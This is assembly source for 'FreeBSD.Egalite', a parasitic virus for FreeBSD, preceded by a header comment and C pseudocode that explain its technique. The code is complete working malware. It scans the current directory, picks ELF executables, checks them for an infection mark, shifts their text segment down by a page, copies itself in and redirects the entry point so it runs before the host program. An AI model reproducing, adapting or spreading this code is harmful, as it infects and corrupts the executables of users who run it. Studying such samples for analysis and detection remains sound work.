; By using this file, you agree to the terms and conditions set
; forth in the COPYING file which can be found at the top level
; of this distribution.
;
; FreeBSD.Egalite herm1t@vx.netlux.org 19-10-2005
;
;      This is very basic parasitic virus for the FreeBSD. It infects one
;    file in current directory. Tested on 5.4R.
;
;      The infection method  ressembles  the well known one used in Linux
;    viruses: text segment is shifted down (in memory) and the virus body
;    and the copy  of the headers  is inserted  before  the start  of the
;    segment. There is only one difference with Linux: FreeBSD ELF loader
;    assumes that all neccessary headers ELF header,  program headers and
;    interp will fit in the first page.  This virus follows the habbit of
;    the  system loader  to make  a broad assumptions  about ELF internal
;    structure. :-)
; 
;	#define	SHIFT_SHDRS(offset,delta) do {				\
; 		if (ehdr->e_shoff >= offset)				\
;	 		ehdr->e_shoff += delta;				\
; 		FOR_EACH_SHDR						\
; 			if (shdr->sh_offset >= offset)			\
; 				shdr->sh_offset += delta;		\
;	} while(0)
;	#define	MAKE_HOLE(off,size) do {				\
;	 	char buf[BUF_SIZE];					\
; 		memset(buf, 0, sizeof(buf));				\
;	 	for (i = 0; i < size / sizeof(buf); i++)		\
; 			ASSERT(write(h, buf, sizeof(buf)) ==		\
; 				sizeof(buf));				\
;	 	ASSERT(write(h, buf, size % sizeof(buf)) ==		\
; 				size % sizeof(buf));			\
;	 	m = mremap(m, l, l + size, 0);				\
; 		if (m == MAP_FAILED)					\
;	 		goto fini_close;				\
; 		if (off < l)						\
; 			memmove(m+off+size, m+off, l-off);		\
; 		l += size;						\
;	} while(0)
;
; 	/* ... at this point the file type and infection mark was	*/
;	/* already checked, and file is mapped into memory 		*/
; 	t = 0;
; 	FOR_EACH_PHDR
; 		if (phdr->p_type == PT_INTERP) {
; 			t = phdr->p_offset + phdr->p_filesz;
; 			break;
; 		}
; 	/* no INTERP, put the virus right after the EHDR,PHDR		*/
; 	if (t == 0)
; 		t = ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr);
; 	/* do we have enough space?					*/
; 	ASSERT((PAGE_SIZE - t) > code_len);
; 	
; 	MAKE_HOLE(0, PAGE_SIZE);
; 	memcpy(m + t, code, code_len);
; 	bzero(m + t + code_len, PAGE_SIZE - code_len);
; 
; 	/* adjust headers						*/
; 	SHIFT_SHDRS(0, PAGE_SIZE);
; 	FOR_EACH_PHDR
; 		/* extend text segment downwards			*/
; 		if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
; 			phdr->p_vaddr -= PAGE_SIZE;
; 			phdr->p_paddr -= PAGE_SIZE;
; 			phdr->p_filesz+= PAGE_SIZE;
; 			phdr->p_memsz += PAGE_SIZE;
; 			ehdr->e_entry = phdr->p_vaddr + t;
; 		} else	/* leave these segments in the beginning...	*/
; 		if (phdr->p_type == PT_PHDR || phdr->p_type == PT_INTERP) {
; 			phdr->p_vaddr -= PAGE_SIZE;
; 			phdr->p_paddr -= PAGE_SIZE;
; 		} else	/* shift the others				*/
; 			phdr->p_offset+= PAGE_SIZE;
;	/* unmap, close and return ...					*/
		BITS	32
		CPU	386
		global	_start
%macro _mov 2
%if %2 == 0
        xor     %1, %1
	%else
		%if %2 < 128
			push    byte %2
			pop     %1
		%else
			mov	%1, %2
		%endif
	%endif
%endmacro
%define	O(x)	(x - virus_start)
%macro	syscall	3
	_mov	eax, %1
	push	eax
	int	0x80
	jnb	%%L1
	add	esp, (%2 * 4)
	jmp	%3
%%L1:	add	esp, (%2 * 4)
%endm

%define	PAGE_SIZE	4096
%define	SYS_write	4
%define	SYS_open	5
%define	SYS_close	6
%define	SYS_lseek	19
%define	SYS_mmap	197
%define	SYS_munmap	73
%define	SYS_getdents	272
%define	D_RECLEN	4
%define	D_NAME		8
%define	PT_LOAD		1
%define	PT_INTERP	3
%define PT_PHDR		6
%define e_entry		24
%define e_phoff		28
%define e_shoff		32
%define e_phnum		44
%define e_shnum		48
%define p_type		0
%define p_offset	4
%define p_vaddr		8
%define p_paddr		12
%define p_filesz	16
%define p_memsz		20
%define p_flags		24
%define p_align		28
%define sh_offset	16

_start:		jmp	virus_start
fake_host:	push	0
		mov	eax, 1
		push	eax
		int	0x80

virus_start:	pusha
		xor	edx, edx
		mov	dh, 4
		sub	esp, edx
		mov	ecx, esp
		mov	word [ecx], 0x2e
		push	0
		push	ecx
		syscall	SYS_open, 3, .a1
		xchg	eax, ebx
		push	1024
		push	ecx
		push	ebx
		call	find_first
		or	eax, eax
		jz	.a1
	.a0:	push	eax
		call	infect
		or	eax, eax
		jnz	.a1
		push	1024
		push	ecx
		push	ebx		
		call	find_next
		or	eax, eax
		jnz	.a0
	.a1:	add	esp, edx
		popa
		push	strict dword fake_host
old_entry	equ	$ - 4
		ret
infect:		pusha
		mov	ebx, [esp + 36]
		xor	eax, eax
		mov	dword [esp + 28], eax
		cld
		push	2
		push	ebx
		syscall	SYS_open, 3, .return
		xchg	eax, ebx
		push	2
		push	0
		push	ebx
		syscall	SYS_lseek, 4, .close
		xchg	eax, edx
		push	0
		push	0		
		push	0
		push	ebx
		push	1	
		push	3
		push	edx
		push	0
		syscall	SYS_mmap, 9, .close
		xchg	eax, esi
		mov	eax, dword [esi]
		add	eax, 0xb9b3ba81
		jnz	.unmap
		cmp	dword [esi + 16], 0x00030002
		jne	.unmap
		mov	eax, [esi + 20]
		dec	eax
		jnz	.unmap
		cmp	byte [esi + 7], 9
		jne	.unmap
		cmp	byte [esi + 8], 1
		je	.unmap
		mov	edi, esi
		add	edi, [esi + e_phoff]
		movzx	ecx, word [esi + e_phnum]
		mov	ebp, ecx
		shl	ebp, 5
		add	ebp, [esi + e_phoff]
	.f0:	cmp	dword [edi + p_type], PT_INTERP
		jne	.f1
		mov	ebp, [edi + p_offset]
		add	ebp, [edi + p_filesz]
		jmp	.f2
	.f1:	add	edi, 32
		loop	.f0
	.f2:	mov	ecx, PAGE_SIZE
		sub	ecx, ebp
		cmp	ecx, VIRUS_SIZE
		jb	.unmap
		pusha
		push	edx
		push	esi
		syscall	SYS_munmap, 3, .unmap
		push	64
		pop	ecx
		sub	esp, ecx
		mov	edi, esp
		xor	eax, eax
		push	ecx
		push	edi
		rep	stosb
		pop	edi
		pop	ecx
	.i0:	push	64
		push	edi
		push	ebx
		mov	eax, SYS_write
		push	eax
		int	0x80
		add	esp, 16
		cmp	eax, 64
		je	.i1
		add	esp, 64
		popa
		jmp	.unmap
	.i1:	loop	.i0
		add	esp, 64
		add	edx, PAGE_SIZE
		push	0
		push	0		
		push	0
		push	ebx
		push	1	
		push	3
		push	edx
		push	0
		mov	eax, SYS_mmap
		push	eax
		int	0x80
		jnc	.i2
		add	esp, 36
		popa
		jmp	.close
	.i2:	add	esp, 36
		xchg	eax, esi
		push	esi
		lea	edi, [esi + edx]
		lea	esi, [edi - PAGE_SIZE]
		lea	ecx, [edx - PAGE_SIZE]
		std
		rep	movsb
		pop	esi
		mov	[esp +  4], esi
		mov	[esp + 20], edx		
		cld
		lea	edi, [esi + ebp]
		call	.a0
	.a0:	pop	esi
		lea	esi, [esi - .a0 + virus_start]
		mov	ecx, VIRUS_SIZE
		rep	movsb
		mov	ecx, PAGE_SIZE - VIRUS_SIZE
		xor	eax, eax
		rep	stosb
		popa
		mov	edi, esi
		add	edi, [esi + e_phoff]
		movzx	ecx, word [esi + e_phnum]
	.h0:	mov	eax, PAGE_SIZE
		cmp	dword [edi + p_type], PT_LOAD
		jne	.h1
		cmp	dword [edi + p_offset], 0
		jne	.h1
		sub	[edi + p_vaddr], eax
		sub	[edi + p_paddr], eax
		add	[edi + p_filesz], eax
		add	[edi + p_memsz], eax
		push	eax
		mov	eax, [esi + e_entry]
		mov	[esi + ebp + O(old_entry)], eax	
		mov	eax, [edi + p_vaddr]
		add	eax, ebp
		mov	[esi + e_entry], eax
		mov	byte [esi + 8], 1
		pop	eax
		jmp	.h4
	.h1:	cmp	dword [edi + p_type], PT_PHDR
		je	.h2
		cmp	dword [edi + p_type], PT_INTERP
		jne	.h3
	.h2:	sub	[edi + p_vaddr], eax
		sub	[edi + p_paddr], eax
		jmp	.h4
	.h3:	add	[edi + p_offset], eax
	.h4:	add	edi, 32
		loop	.h0
		mov	eax, PAGE_SIZE
		add	[esi + e_shoff], eax
		mov	edi, esi
		add	edi, [esi + e_shoff]
		movzx	ecx, word [esi + e_shnum]
	.g0:	add	[edi + sh_offset], eax
		add	edi, 40
		loop	.g0
		inc	dword [esp + 28]
.unmap:		push	edx
		push	esi
		mov	eax, SYS_munmap
		push	eax
		int	0x80
		add	esp, 12
.close:		push	ebx
		mov	eax, SYS_close
		push	eax
		int	0x80
		add	esp, 8
.return:	popa
		retn	4
find_first:	pusha
		xor	eax, eax
		mov	edi, [esp + 40]
		mov	[edi], eax
		jmp	find_next.s0
find_next:	pusha
		mov	edi, [esp + 40]
	.s0:	mov	ebx, [esp + 36]
		mov	ecx, [esp + 44]
		mov	edx, [edi]
		or	edx, edx
		jnz	.s2
		push	ecx
		push	edi
		push	ebx
		syscall	SYS_getdents, 4, .s4
		or	eax, eax
		jz	.s4
		xor	ebp, ebp
	.s1:	add	bp, word [edi + ebp + D_RECLEN]
		inc	edx
		cmp	ebp, eax
		jb	.s1
		jmp	.s3
	.s2:	push	edi
		movzx	eax, word [edi + D_RECLEN]
		lea	esi, [edi + eax]
		sub	ecx, eax
		cld
		rep	movsb
		pop	edi
	.s3:	dec	edx
		lea	eax, [edi + D_NAME]
		jmp	.s5
	.s4:	xor	eax, eax
	.s5:	mov	[esp + 28], eax
		mov	[edi], edx
		popa
		retn	12
VIRUS_SIZE	equ	O($)
